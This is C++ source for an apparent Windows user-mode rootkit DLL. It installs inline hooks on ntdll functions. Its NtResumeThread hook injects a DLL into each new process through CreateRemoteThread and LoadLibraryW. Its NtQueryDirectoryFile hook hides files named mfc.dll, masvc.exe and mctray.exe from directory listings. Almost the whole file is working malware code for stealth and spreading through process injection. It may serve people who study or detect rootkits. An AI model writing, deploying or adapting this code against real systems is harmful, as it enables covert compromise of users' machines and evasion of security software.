#include "pch.h"
#include "apihook.h"
#include <iostream>
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)




PVOID AllocatePageNearAddress(PVOID targetAddr)
{
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    const uint64_t PAGE_SIZE = sysInfo.dwPageSize;

    uint64_t startAddr = (uint64_t(targetAddr) & ~(PAGE_SIZE - 1)); //round down to nearest page boundary
    uint64_t minAddr = min(startAddr - 0x7FFFFF00, (uint64_t)sysInfo.lpMinimumApplicationAddress);
    uint64_t maxAddr = max(startAddr + 0x7FFFFF00, (uint64_t)sysInfo.lpMaximumApplicationAddress);

    uint64_t startPage = (startAddr - (startAddr % PAGE_SIZE));

    uint64_t pageOffset = 1;
    while (1)
    {
        uint64_t byteOffset = pageOffset * PAGE_SIZE;
        uint64_t highAddr = startPage + byteOffset;
        uint64_t lowAddr = (startPage > byteOffset) ? startPage - byteOffset : 0;

        bool needsExit = highAddr > maxAddr && lowAddr < minAddr;

        if (highAddr < maxAddr)
        {
            PVOID outAddr = VirtualAlloc((PVOID)highAddr, PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (outAddr)
                return outAddr;
        }

        if (lowAddr > minAddr)
        {
            PVOID outAddr = VirtualAlloc((PVOID)lowAddr, PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (outAddr != nullptr)
                return outAddr;
        }

        pageOffset++;

        if (needsExit)
        {
            break;
        }
    }

    return nullptr;
}


void WriteAbsoluteJump64(PVOID absJumpMemory, PVOID addrToJumpTo)
{


    uint8_t  absJumpInstructions[] =
    {
      0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //mov 8 bytes into r11. BA = JMP
      0x41, 0xFF, 0xE2 //jmp r11
    };

    uint64_t  addrToJumpTo64 = (uint64_t)addrToJumpTo;
    memcpy(&absJumpInstructions[2], &addrToJumpTo64, sizeof(addrToJumpTo64));
    memcpy(absJumpMemory, absJumpInstructions, sizeof(absJumpInstructions));
}


BOOL WINAPI InitAPIHook(PAPI_HOOK Hook, PVOID HookedFunction, LPCWSTR module, LPCSTR funcName)
{

    if (Hook->Hooked == TRUE)
    {
        return FALSE;

    }

    HMODULE hModule = GetModuleHandleW(module);


    if (hModule == NULL)
    {
        Hook->Hooked = FALSE;
        return FALSE;

    }

    Hook->FunctionAddress = GetProcAddress(hModule, funcName);
    if (Hook->FunctionAddress == NULL)
    {
        Hook->Hooked = FALSE;
        return FALSE;

    }


    PVOID relayFuncMemory = AllocatePageNearAddress(Hook->FunctionAddress);


    if (AllocatePageNearAddress == nullptr) {

        return FALSE;
    }

    WriteAbsoluteJump64(relayFuncMemory, HookedFunction); //write relay func instructions

    //now that the relay function is built, we need to install the E9 jump into the target func,
    //this will jump to the relay function
    DWORD oldProtect;
    if (VirtualProtect(Hook->FunctionAddress, 1024, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {

        return FALSE;
    }


    //32 bit relative jump opcode is E9, takes 1 32 bit operand for jump offset
    uint8_t jmpInstruction[5] = { 0xE9, 0x0, 0x0, 0x0, 0x0 };

    //to fill out the last 4 bytes of jmpInstruction, we need the offset between 
    //the relay function and the instruction immediately AFTER the jmp instruction
    const uint64_t relAddr = (uint64_t)relayFuncMemory - ((uint64_t)Hook->FunctionAddress + 5);
    memcpy(jmpInstruction + 1, &relAddr, 4);

    //copy the original 5 bytes to another memory location
    Hook->OrigFunction = VirtualAlloc(NULL, 21, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(Hook->OrigBytes, Hook->FunctionAddress, 5);




    if (Hook->OrigFunction == NULL)
    {

        return FALSE;
    }



    uint8_t  JumpToOrg[] =
    {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, //mov 8 bytes into r10
      0x00, 0x00, 0x00, 0x41, 0xFF, 0xE3 //jmp r10
    };


    uint64_t hook_address = (uint64_t)Hook->FunctionAddress + 8;

    memcpy(&JumpToOrg[0], Hook->FunctionAddress, 8);
    memcpy(&JumpToOrg[10], &hook_address, 8);
    memcpy(Hook->OrigFunction, JumpToOrg, 21);




    //install the hook
    memcpy(Hook->FunctionAddress, jmpInstruction, 5);

    Hook->Hooked = TRUE;
    VirtualProtect(Hook->FunctionAddress, 1024, oldProtect, &oldProtect);

    return TRUE;
} 


API_HOOK NRTHookNTResume;
API_HOOK NRTHookDirectoryFile;

typedef NTSTATUS(NTAPI* pNtResumeThread)(HANDLE hThread, PULONG SuspendCount);
typedef NTSTATUS(NTAPI* pNtQueryInformationThread)(HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass, PVOID ThreadInformation, ULONG ThreadInformationLength, PULONG ReturnLength);
typedef NTSTATUS(NTAPI* pNtClose)(HANDLE Handle);
typedef NTSTATUS(NTAPI* pHookNtQueryDirectoryFile)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation,
    ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);


NTSTATUS NTAPI HookNtResumeThread(HANDLE hThread, PULONG SuspendCount) {
    HANDLE hProcess;
    pNtResumeThread fnNtResumeThread = (pNtResumeThread)NRTHookNTResume.OrigFunction;
    BYTE byte;
    PVOID mem;
    THREAD_BASIC_INFORMATION tbi;
    LPWSTR lpMsgBuf;
    HMODULE hModule = GetModuleHandleW(L"ntdll.dll");
    DWORD dwThreadId;

    if (hModule == NULL)
    {
        return FALSE;

    }

    pNtClose fnNtClose = (pNtClose)GetProcAddress(hModule, "NtClose");
    pNtQueryInformationThread fnNtQueryInformationThread = (pNtQueryInformationThread)GetProcAddress(hModule, "NtQueryInformationThread");


    if (NT_SUCCESS(fnNtQueryInformationThread(hThread, (THREADINFOCLASS)0, &tbi, sizeof(THREAD_BASIC_INFORMATION), NULL))) {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)tbi.ClientId.UniqueProcess);
        if (hProcess != INVALID_HANDLE_VALUE) {

            LPCTSTR lpDllPath = TEXT("C:\\Users\\Oryan\\Desktop\\Mars\\code and process injection\\rootkit\\IATHooking_64_DLL\\x64\\Release\\Dll1.dll");
            size_t dwInjectedDllPathSize = _tcslen(lpDllPath) * sizeof(TCHAR) + sizeof(TCHAR);
            LPVOID pExAddress = VirtualAllocEx(hProcess, NULL, dwInjectedDllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (pExAddress != NULL) {
                if (WriteProcessMemory(hProcess, pExAddress, lpDllPath, dwInjectedDllPathSize, NULL) != 0) {
                    LPVOID pLoadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "LoadLibraryW");
                    HANDLE newHThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryAddr, pExAddress, 0, &dwThreadId);

                }
            }
        }
    }
    return fnNtResumeThread(hThread, SuspendCount);
}


BOOL GetPathFromHandle(HANDLE file, LPWSTR fileName, DWORD fileNameLength)
{
    BOOL result = FALSE;

    WCHAR path[MAX_PATH + 1];
    if (GetFinalPathNameByHandleW(file, path, MAX_PATH, FILE_NAME_NORMALIZED) > 0 && !_wcsnicmp(path, L"\\\\?\\", 4))
    {
        PWCHAR resultFileName = &path[4];
        if ((DWORD)lstrlenW(resultFileName) <= fileNameLength)
        {
            lstrcpyW(fileName, resultFileName);
            result = TRUE;
        }
    }

    return result;
}


LPWSTR FileInformationGetName(LPVOID fileInformation, FILE_INFORMATION_CLASS fileInformationClass, LPWSTR name)
{
    PWCHAR fileName = NULL;
    ULONG fileNameLength = 0;

    switch (fileInformationClass)
    {
    case FileDirectoryInformation:
        fileName = ((PFILE_DIRECTORY_INFORMATION)fileInformation)->FileName;
        fileNameLength = ((PFILE_DIRECTORY_INFORMATION)fileInformation)->FileNameLength;
        break;
    case 2:
        fileName = ((PFILE_FULL_DIR_INFORMATION)fileInformation)->FileName;
        fileNameLength = ((PFILE_FULL_DIR_INFORMATION)fileInformation)->FileNameLength;
        break;
    case 38:
        fileName = ((PFILE_ID_FULL_DIR_INFORMATION)fileInformation)->FileName;
        fileNameLength = ((PFILE_ID_FULL_DIR_INFORMATION)fileInformation)->FileNameLength;
        break;
    case 3:
        fileName = ((PFILE_BOTH_DIR_INFORMATION)fileInformation)->FileName;
        fileNameLength = ((PFILE_BOTH_DIR_INFORMATION)fileInformation)->FileNameLength;
        break;
    case 37:
        fileName = ((PFILE_ID_BOTH_DIR_INFORMATION)fileInformation)->FileName;
        fileNameLength = ((PFILE_ID_BOTH_DIR_INFORMATION)fileInformation)->FileNameLength;
        break;
    case 12:
        fileName = ((PFILE_NAMES_INFORMATION)fileInformation)->FileName;
        fileNameLength = ((PFILE_NAMES_INFORMATION)fileInformation)->FileNameLength;
        break;
    }

    if (fileName && fileNameLength > 0)
    {
        wmemcpy(name, fileName, fileNameLength / sizeof(WCHAR));
        name[fileNameLength / sizeof(WCHAR)] = L'\0';
        return name;
    }
    else
    {
        return NULL;
    }
}

bool HasPrefix(LPCWSTR str)
{
    return str && (!_wcsnicmp(str, L"mfc.dll", (sizeof(L"mfc.dll")/sizeof(WCHAR)-1)) || (!_wcsnicmp(str, L"masvc.exe", (sizeof(L"masvc.exe") / sizeof(WCHAR) - 1))) || (!_wcsnicmp(str, L"mctray.exe", (sizeof(L"mctray.exe") / sizeof(WCHAR) - 1))));
}


void FileInformationSetNextEntryOffset(LPVOID fileInformation, FILE_INFORMATION_CLASS fileInformationClass, ULONG value)
{
    switch (fileInformationClass)
    {
    case FILE_INFORMATION_CLASS::FileDirectoryInformation:
        ((PFILE_DIRECTORY_INFORMATION)fileInformation)->NextEntryOffset = value;
        break;
    case 2:
        ((PFILE_FULL_DIR_INFORMATION)fileInformation)->NextEntryOffset = value;
        break;
    case 38:
        ((PFILE_ID_FULL_DIR_INFORMATION)fileInformation)->NextEntryOffset = value;
        break;
    case 3:
        ((PFILE_BOTH_DIR_INFORMATION)fileInformation)->NextEntryOffset = value;
        break;
    case 37:
        ((PFILE_ID_BOTH_DIR_INFORMATION)fileInformation)->NextEntryOffset = value;
        break;
    case 12:
        ((PFILE_NAMES_INFORMATION)fileInformation)->NextEntryOffset = value;
        break;
    }
}

ULONG FileInformationGetNextEntryOffset(LPVOID fileInformation,FILE_INFORMATION_CLASS fileInformationClass)
{
    switch (fileInformationClass)
    {
    case FILE_INFORMATION_CLASS::FileDirectoryInformation:
        return ((PFILE_DIRECTORY_INFORMATION)fileInformation)->NextEntryOffset;
    case 2:
        return ((PFILE_FULL_DIR_INFORMATION)fileInformation)->NextEntryOffset;
    case 38:
        return ((PFILE_ID_FULL_DIR_INFORMATION)fileInformation)->NextEntryOffset;
    case 3:
        return ((PFILE_BOTH_DIR_INFORMATION)fileInformation)->NextEntryOffset;
    case 37:
        return ((PFILE_ID_BOTH_DIR_INFORMATION)fileInformation)->NextEntryOffset;
    case 12:
        return ((PFILE_NAMES_INFORMATION)fileInformation)->NextEntryOffset;
    default:
        return 0;
    }
}

NTSTATUS NTAPI HookNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation,
    ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan)
{
    pHookNtQueryDirectoryFile fnHookNtQueryDirectoryFile = (pHookNtQueryDirectoryFile)NRTHookDirectoryFile.OrigFunction;
    NTSTATUS status = fnHookNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
    
    if (NT_SUCCESS(status) && (FileInformationClass == FileDirectoryInformation || FileInformationClass == 2 || FileInformationClass == 38 || FileInformationClass == 3 || FileInformationClass == 37 || FileInformationClass == 12))
    {
        LPVOID current = FileInformation;
        LPVOID previous = NULL;
        ULONG nextEntryOffset;

        WCHAR fileDirectoryPath[MAX_PATH + 1] = { 0 };
        WCHAR fileFileName[MAX_PATH + 1] = { 0 };
        WCHAR fileFullPath[MAX_PATH + 1] = { 0 };

       
        GetPathFromHandle(FileHandle, fileDirectoryPath, MAX_PATH);

        do
        {
            nextEntryOffset = FileInformationGetNextEntryOffset(current, FileInformationClass);

            if (HasPrefix(FileInformationGetName(current, FileInformationClass, fileFileName)))
            {
                if (nextEntryOffset)
                {
                    RtlCopyMemory
                    (
                        current,
                        (LPBYTE)current + nextEntryOffset,
                        (ULONG)(Length - ((ULONGLONG)current - (ULONGLONG)FileInformation) - nextEntryOffset)
                    );
                    continue;
                }
                else
                {
                    if (current == FileInformation) status = (NTSTATUS)0x80000006L;//STATUS_NO_MORE_FILES
                    else FileInformationSetNextEntryOffset(previous, FileInformationClass, 0);
                    break;
                }
            }

            previous = current;
            current = (LPBYTE)current + nextEntryOffset;
        }
        while (nextEntryOffset);
    }
    return status;

}
    
BOOL checkProcessIsExolorer() {
    //check if the current process is explorer

    DWORD currentID;
    HANDLE hProcessSnapshot;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    currentID = GetCurrentProcessId();
    hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    if (!Process32First(hProcessSnapshot, &pe32))
    {
        CloseHandle(hProcessSnapshot);
        return FALSE;
    }

    do {
        if (_tcscmp(pe32.szExeFile, L"explorer.exe") == 0) {
            if (pe32.th32ProcessID == currentID) {
                return TRUE;
            }
        }
        
    } while (Process32Next(hProcessSnapshot, &pe32));

    return FALSE;
}


int apihook_main()
{
    if (checkProcessIsExolorer() == FALSE) {
        BOOL result1 = InitAPIHook(&NRTHookNTResume, HookNtResumeThread, L"ntdll.dll", "NtResumeThread");
    }
    BOOL result2 = InitAPIHook(&NRTHookDirectoryFile, HookNtQueryDirectoryFile, L"ntdll.dll", "NtQueryDirectoryFile");
    
     

    return 0;
}
